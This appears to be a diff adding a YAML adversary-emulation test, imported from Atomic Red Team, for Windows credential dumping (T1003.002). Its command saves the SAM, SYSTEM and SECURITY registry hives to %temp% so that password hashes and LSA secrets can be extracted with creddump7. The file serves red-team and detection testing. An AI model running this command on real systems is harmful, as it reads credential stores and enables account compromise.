@@ -1,0 +1,36 @@
+- id: 5c2571d0-1572-416d-9676-812e64ca9f44
+  name: Registry dump of SAM, creds, and secrets
+  description: 'Local SAM (SAM & System), cached credentials (System & Security) and
+    LSA secrets (System & Security) can be enumerated
+
+    via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7
+
+
+    Upon successful execution of this test, you will find three files named, sam,
+    system and security in the %temp% directory.'
+  tactic: credential-access
+  technique:
+    attack_id: T1003.002
+    name: 'OS Credential Dumping: Security Account Manager'
+  platforms:
+    windows:
+      sh:
+        command: reg save HKLM\sam %temp%\sam; reg save HKLM\system %temp%\system;
+          reg save HKLM\security %temp%\security
+        cleanup: del %temp%\sam >nul 2> nul; del %temp%\system >nul 2> nul; del %temp%\security
+          >nul 2> nul
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1003.002
+  - credential-access
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    technique_created: '2020-02-11T18:42:07.281Z'
+    atomic_guid: 5c2571d0-1572-416d-9676-812e64ca9f44
+    import_timestamp: '2025-06-24T11:15:06.133279Z'
